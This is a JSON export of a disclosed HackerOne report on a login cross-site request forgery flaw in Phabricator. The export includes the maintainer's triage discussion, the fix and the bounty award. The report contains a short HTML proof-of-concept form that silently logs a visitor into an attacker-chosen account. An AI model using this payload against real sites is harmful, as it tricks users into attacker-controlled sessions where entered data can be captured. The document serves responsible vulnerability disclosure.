{"id":774,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzQ=","url":"https://hackerone.com/reports/774","title":"Log in a user to another account","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-01-23T12:54:26.529Z","submitted_at":"2014-01-23T12:54:26.529Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dawidczagan","url":"/dawidczagan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":18,"url":"https://hackerone.com/phabricator","handle":"phabricator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Phabricator","twitter_handle":"phabricator","website":"http://phacility.com/phabricator/","about":"Phabricator is a collection of open source web applications that help software companies build better software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-02-22T22:21:32.666Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2014-01-23T22:25:59.235Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"It is possible to log in the user to another account (no CSRF token). POC (for demonstration purposes with Submit button; normally sent automatically):\r\n\r\n\u003chtml\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"http://DOMAIN-WITH-PHABRICATOR/auth/login/password:self/\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"\u0026#95;\u0026#95;dialog\u0026#95;\u0026#95;\" value=\"1\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"username\" value=\"user3\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"password\" value=\"password3\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n\r\nThe user needs to be logged out, when the aforementioned request is submitted. It is assumed that user3 with password3 exists.\r\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-02-22T22:21:23.527Z","allow_singular_disclosure_after":-240858280.64323035,"singular_disclosure_allowed":true,"vote_count":11,"voters":["nrobb","gamliel","eveeez","an0nym0us","akhil-reni","cryptographer","spetr0x","subratjna","priyanshu1234","skeltavik","and 1 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4182,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This doesn't seem very dangerous to me, except that it could theoretically be the first step in a longer chain of techniques that might do something more dangerous. Is there a reason this is inherently dangerous that I'm not aware of?","automated_response":false,"created_at":"2014-01-23T15:14:15.407Z","updated_at":"2014-01-23T15:14:15.407Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4183,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Security is as strong as its weakest point. The attacker might be interested in logging the user into his account. Let me describe two exemplary scenarios:\n1. The attacker logs the user into his account. The user thinks, that he uses his own account and enters credit card details - now the attacker knows these details.\n2. The attacker logs the user into his account. The user thinks, that he uses his own account and submits a bug in the system - the credit goes to the attacker.\nThere are many reasons why it would be profitable for the attacker (it depends on what the attacker wants to achieve).\n\nRegards,\nDawid Czagan","automated_response":false,"created_at":"2014-01-23T15:59:12.676Z","updated_at":"2014-01-23T15:59:12.676Z","actor":{"username":"dawidczagan","cleared":false,"url":"/dawidczagan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4184,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This attack is possible from technical point of view (Login CSRF) and can be profitable for the attacker  - the reason or motivation of attacker is another story (dependent on the system). I just wanted to show that it's possible, as this program at HackerOne is dedicated for technical vulnerabilities.","automated_response":false,"created_at":"2014-01-23T16:06:18.478Z","updated_at":"2014-01-23T16:06:18.478Z","actor":{"username":"dawidczagan","cleared":false,"url":"/dawidczagan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4185,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I think the impact of the attack is relevant, and I'm not sure this attack can be profitable for the attacker. You don't enter credit cards or receive credit for reporting bugs on a typical Phabricator system, and the UI is full of cues that you're logged in and about which identity you're logged in with.\n\nThat said, there's no real product/technical reason not to CSRF logged-out users, and this is a weakness we weren't previously thinking about, so I'm going to accept this.\n\nI'll try to fix this today, or provide an update if I'm not able to. Fixing this involves touching a fair amount of session code, and may take more than a day to develop and test a durable, long-term fix. (I think the impact of this attack is too low to justify developing a faster/riskier fix that might break things.)\n\nYou can follow progress here: https://secure.phabricator.com/T4339","automated_response":false,"created_at":"2014-01-23T16:39:22.906Z","updated_at":"2014-01-23T16:39:22.906Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4187,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Does this vulnerability qualify for a bounty?","automated_response":false,"created_at":"2014-01-23T17:37:42.557Z","updated_at":"2014-01-23T17:37:42.557Z","actor":{"username":"dawidczagan","cleared":false,"url":"/dawidczagan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4189,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes.\n\n(Sorry if I wasn't clear -- that's what I meant by \"I'm going to accept this\".)","automated_response":false,"created_at":"2014-01-23T17:45:44.153Z","updated_at":"2014-01-23T17:45:44.153Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4199,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This should be fixed in HEAD -- for details, see the changes attached here:\n\n\u003chttps://secure.phabricator.com/T4339\u003e\n\nRoughly, logged-out users are now subject to the same CSRF checks that logged-in users are subject to.","automated_response":false,"created_at":"2014-01-23T22:21:23.605Z","updated_at":"2014-01-23T22:21:23.605Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dawidczagan","url":"/dawidczagan"},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4200,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report!","automated_response":false,"created_at":"2014-01-23T22:24:38.277Z","updated_at":"2014-01-23T22:24:38.277Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Phabricator"}},"bounty_amount":"300.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"phabricator","collaborator":{"username":"dawidczagan","url":"/dawidczagan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4201,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"(This can be disclosed immediately, it's already public in Phabricator and has very mild, mostly-theoretical impact.)","automated_response":false,"created_at":"2014-01-23T22:25:59.246Z","updated_at":"2014-01-23T22:25:59.246Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8903,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2014-02-22T22:21:32.713Z","updated_at":"2014-02-22T22:21:32.713Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Phabricator"}},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}